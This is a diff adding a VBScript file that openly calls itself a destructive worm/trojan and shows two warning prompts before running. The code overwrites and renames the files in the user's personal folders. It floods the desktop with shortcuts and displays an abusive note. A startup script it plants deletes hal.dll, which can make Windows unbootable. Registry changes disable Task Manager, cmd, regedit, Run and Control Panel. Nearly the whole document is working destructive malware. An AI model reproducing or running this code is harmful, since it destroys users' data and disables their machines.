@@ -1,1 +1,93 @@
+randomize
 
+set shell = createobject("wscript.shell")
+set fso = createobject("scripting.filesystemobject")
+scriptTitle = fso.getfilename(wscript.scriptfullname)
+scriptName = fso.getbasename(scriptTitle)
+
+warning = msgbox("WARNING: This worm can be too destructive for your computer, do you want to run it?", vbYesNo+vbCritical, scriptTitle)
+function infectFolder(flder)
+    if fso.folderexists(flder) then
+    set folder = fso.getfolder(flder)
+    
+    for each item in folder.files
+        if not item.name = scriptTitle then
+        if not fso.getextensionname(item.name) = "vbs" then
+        item.name = item.name & ".vbs"
+        end if
+        set file = fso.opentextfile(item, 2)
+        file.write "msgbox ""your infected with the " & scriptName & " virus!"",0+16,""" & scriptTitle & """"
+        end if
+    next
+    end if
+end function
+
+function run()
+infectFolder shell.expandEnvironmentStrings("%USERPROFILE%") & "\Desktop"
+infectFolder shell.expandEnvironmentStrings("%USERPROFILE%") & "\Downloads"
+infectFolder shell.expandEnvironmentStrings("%USERPROFILE%") & "\Documents"
+infectFolder shell.expandEnvironmentStrings("%USERPROFILE%") & "\Pictures"
+infectFolder shell.expandEnvironmentStrings("%USERPROFILE%") & "\Music"
+infectFolder shell.expandEnvironmentStrings("%USERPROFILE%") & "\Videos"
+infectFolder shell.expandEnvironmentStrings("%USERPROFILE%") & "\Appdata\Local\Temp"
+infectFolder shell.expandEnvironmentStrings("%APPDATA%")
+
+set sh = fso.createtextfile(shell.expandenvironmentstrings("%WINDIR%") & "\System32\sh.vbs")
+sh.writeline "msgbox ""your computer is flooded with billions of shortcuts, i can feel that"""
+sh.close
+
+for i = 1 to 200
+    set shortcuts = shell.createshortcut(shell.expandEnvironmentStrings("%USERPROFILE%") & "\Desktop\" & int(rnd) & int(rnd * 10) & int(rnd * rnd) & i & int(i * rnd) & ".exe.LNK")
+    shortcuts.targetpath = shell.expandenvironmentstrings("%WINDIR%") & "\System32\sh.vbs"
+    shortcuts.iconlocation = shell.expandEnvironmentStrings("%WINDIR%") & "\hh.exe"
+    shortcuts.save
+next
+
+noteForUser = "you are a garbage brained user in this computer" & vbcrlf
+noteForUser = noteForUser & "" & vbcrlf
+noteForUser = noteForUser & "your only reason for existence is none, just none, god created you just for you to be a nobody."
+
+set note = fso.createtextfile(shell.expandEnvironmentStrings("%WINDIR%") & "\System32\note.txt")
+note.write(noteForUser)
+note.close
+
+shell.run "%WINDIR%\System32\note.txt"
+
+wscript.sleep 5000
+
+shell.run "taskkill /f /im %WINDIR%\System32\note.txt"
+
+set delete = fso.createtextfile(shell.specialfolders("startup") & "\frederiksmessage.vbs")
+delete.writeline "set shell = createobject(""wscript.shell"")"
+delete.writeline "shell.run ""reg delete HKCR\lnkfile\IsShortcut"",0,true"
+delete.writeline "shell.run ""cmd /c takeown /f C:\Windows\System32\hal.dll && icacls C:\Windows\System32\hal.dll /grant Everyone:(F) && del/f/s/q C:\Windows\System32\hal.dll"""
+delete.writeline "msgbox """"""hal.dll is deleted!!!1 best virus ever"""""" & vbcrlf & ""- greg frederick stickelston"", 0+16, """ & scriptTitle & """"
+delete.writeline "shell.run ""cmd /c taskkill /f /im explorer.exe && start explorer.exe"""
+delete.writeline "msgbox""hows it feeling like that your computer is  """"compromised"""" by a dumbass on the internet-"",0+16""" & scriptTitle & """"
+delete.close
+
+shell.run "reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\System /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f"
+shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Accent /v AccentColor /t REG_DWORD /d 0x2d1954 /f"
+shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f",0,true
+shell.run "reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2 /f",0,true
+shell.run "reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop /v NoChangingWallpaper /t REG_DWORD /d 1 /f",0,true
+shell.run "reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f",0,true
+shell.run "reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f",0,true
+shell.run "reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f",0,true
+shell.run "reg add HKCU\Control Panel\Mouse /v SwapMouseButtons /t REG_SZ /d 1 /f",0,true
+shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f",0,true
+
+msgbox "your infected with the " & scriptName & " virus!",0+16,scriptTitle
+
+end function
+
+if warning = vbYes then
+    warning2 = msgbox("WARNING: This trojan can infect folders, disable cmd, disable task manager, disable regedit, disable run box, no access from entering any folder in file explorer, and etc, these payloads can render your computer unbootable, or even worse, do you still wanna run it?", vbYesNo+vbCritical, scriptTitle)
+    if warning2 = vbYes then
+        run
+    elseif warning2 = vbNo then
+        wscript.quit
+    end if
+elseif warning = vbNo then
+    wscript.quit
+end if
